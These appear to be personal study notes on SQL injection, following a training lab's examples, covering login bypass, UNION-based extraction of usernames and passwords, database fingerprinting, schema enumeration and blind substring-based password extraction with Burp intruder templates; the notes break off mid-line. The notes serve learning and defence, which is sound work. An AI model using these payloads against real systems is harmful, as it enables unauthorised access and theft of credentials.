SQL Injection

    Impact of a successful SQL injection

        Passwords.
        Credit card details.
        Personal user information.

    Detect SQL injection vulnerabilities

        1)  ' and look for errors or other anomalies. 
        2)  OR 1=1  |   OR 1=2 and look for differences in the application's responses. 
        3)  time delays when executed within a SQL query, and look for differences in the time taken to respond. 


    SQL injection in different parts of the query

        In UPDATE statements, within the updated values or the WHERE clause.
        In INSERT statements, within the inserted values.
        In SELECT statements, within the table or column name.
        In SELECT statements, within the ORDER BY clause.
        In SELECT statements, within the WHERE clause.

    SQL injection examples

        1)    Retrieving hidden data, where you can modify a SQL query to return additional results.
        2)    Subverting application logic, where you can change a query to interfere with the application's logic.
        3)    UNION attacks, where you can retrieve data from different database tables.
        4)    Blind SQL injection, where the results of a query you control are not returned in the application's responses.


#1) Retrieving hidden data

        URL -> https://insecure-website.com/products?category=Gifts
        SQL query -> SELECT * FROM products WHERE category = 'Gifts' AND released = 1

        URL -> https://insecure-website.com/products?category=Gifts'--
        SQL query -> SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

        URL -> https://insecure-website.com/products?category=Gifts'+OR+1=1--
        SQL query -> SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

        The modified query returns all items where either the category is Gifts,
        or 1 is equal to 1. As 1=1 is always true, the query returns all items. 

        Warning : OR 1=1 is always true, If your condition reaches an UPDATE or DELETE statement, for example, 
        it can result in an accidental loss of data.


    # Subverting application logic

        the application checks the credentials by performing the following SQL query: 
            
            SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' 
        
        attacker can log in as any user without the need for a password.
        URL -> https://insecure-website.com/login?username=administrator'--
        SQL query -> SELECT * FROM users WHERE username = 'administrator'--' AND password = ''




#2) UNION attacks
        WE can use the UNION keyword to retrieve data from other tables within the database.

        SELECT a, b FROM table1 UNION SELECT c, d FROM table2


    UNION query to work, two key requirements must be met: 
        1)    The individual queries must return the same number of columns. 
        2)    The data types in each column must be SAME between the individual TABLE.
    
    for UNION attack we have to find out 
        1)    the number of columns returned by the original query. 
        2)    the data type of each of the columns returned by the query.

    two effective methods to find number of columns required
        1) ' ORDER BY 1--  (incrementing the specified column index until an error occurs)
        2) ' UNION SELECT NULL,NULL--  (incrementing the number of NULL values until an error occurs)

    # ORDER BY clause can be specified by its index, so we don't need to know the names of any columns.
    When the specified column index exceeds the number of actual columns in the result set, 
    the database returns an error

    # All queries combined using a UNION, INTERSECT or EXCEPT operator 
    must have an equal number of expressions in their target lists.
    # NULL is convertible to every common data type, so it maximizes the chance that the 
    payload will succeed when the column count is correct. 

    #in ORDER BY technique  the application might actually return the database error in its HTTP response,
    but may return a generic error or simply return no results. 
    
    #When the number of nulls matches the number of columns, and If you are lucky
    the database returns an additional row in the result set, containing null values in each column.
    Otherwise, the null values might trigger a different error, such as a @NullPointerException. 
    In the worst case, the response might look the same as a response caused by an incorrect number
    of nulls. This would make this method ineffective. 


    Database-specific syntax
        MySQL -> UNION SELECT NULL,NULL,NULL--
                        (
                           On MySQL, the double-dash sequence must be followed by a space.
                           Alternatively, the hash character # can be used to identify a comment.  
                        )

        Oracle -> UNION SELECT NULL,NULL,NULL FROM DUAL-- 
                        (
                           There is a built-in table on Oracle called dual 
                           which can be used for verifying the number of columns
                        )

        Microsoft SQL Server -> UNION SELECT NULL,NULL,NULL--
        PostgreSQL -> UNION SELECT NULL,NULL,NULL--

    
    Finding columns with a useful data type
         to test whether it can hold string data.
         We can submit a series of UNION SELECT payloads that place a string value into each column in turn.

        ' UNION SELECT 'a',NULL,NULL,NULL--
        ' UNION SELECT NULL,'a',NULL,NULL--
        ' UNION SELECT NULL,NULL,'a',NULL--
        ' UNION SELECT NULL,NULL,NULL,'a'--

    # UNION attack to retrieve interesting data from the database.
        ' UNION SELECT username, password FROM users--        

    # Retrieving multiple values within a single column
        ' UNION SELECT username || '~' || password FROM users--

        Different databases use different syntax to perform string concatenation.

        MySQL -> CONCAT(username, '~', password)
                username || '~' || password
                'string1' || 'string2' || 'string3'
        Oracle -> username || '~' || password
        Microsoft SQL Server -> username + '~' + password
        PostgreSQL -> username || '~' || password

#3) Examining the database in SQL injection attacks
    To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

        1) The type and version of the database software.
        2) The tables and columns that the database contains.

    # Finding the database type and version
        We can potentially identify both the database type and version
        by injecting provider-specific queries to see if one works 

        Database type 	        Query
        Microsoft, MySQL 	' UNION SELECT @@version--
        Oracle 	            ' UNION SELECT * FROM v$version from DUAL--
        PostgreSQL 	        ' UNION SELECT version()--

    Listing the contents of the database
        
        #Most database types (except Oracle) have a set of views called the information schema. 
        This provides information about the database. 

        SELECT * FROM information_schema.tables   (MySQL, Microsoft, PostgreSQL)
        SELECT * FROM all_tables                  (Oracle)

        # We can then query information_schema.columns to list the columns in individual tables: 

        SELECT * FROM information_schema.columns WHERE table_name = 'Users_Table_Name'    (MySQL, Microsoft, PostgreSQL)
        SELECT * FROM all_tab_columns WHERE table_name = 'Users_Table_Name'               (Oracle)

#4)  Blind SQL injection
    
      HTTP responses do not contain the results of the relevant SQL query
      or the details of any database errors. 

      Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. 


     #Exploiting blind SQL injection by triggering conditional responses

            To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
                    …xyz'AND'1'='1 (no SPACE in between query string)
                    …xyz' AND '1'='2

            The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
            The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

    # SUBSTRING (input_string, start, length);


            Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
            SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

            select tID from tUSER where tID = cokkie 
            select tID from tUSER where tID = cokkie'and 'a'='a   #for crafting and manual testing on repeater
            select tID from tUSER where tID = cokkie'and substring('apple',1,1)='a   #for crafting and manual testing on repeater
                            = cokkie'and substring('apple',1,1)>'a   #for crafting and manual testing on repeater
                            = cokkie'and substring((SELECT password FROM users WHERE username = 'administrator'),1,1)> 'a    	 # for crafting and manual testing on repeater
                            = cokkie'and substring((SELECT password FROM users WHERE username = 'administrator'),1,1)= '$a$   	 # for simple sniper intruder
                            = cokkie'and substring((SELECT password FROM users WHERE username = 'administrator'),$1$,1)= '$a$    	 # use cluster bomb intruder
                            



                            Oracle  	SUBSTR('foobar', 4, 2)
                            Microsoft 	SUBSTRING('foobar', 4, 2)
                            PostgreSQL 	SUBSTRING('foobar', 4, 2)
                            MySQL 	    SUBSTRING('foobar', 4, 2) 



   


xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's

'and substring((SELECT PASSWORD FROM USERS WHERE USERNAME = 'ADMIN'),1,1)= 'a

select trackinid from user where tra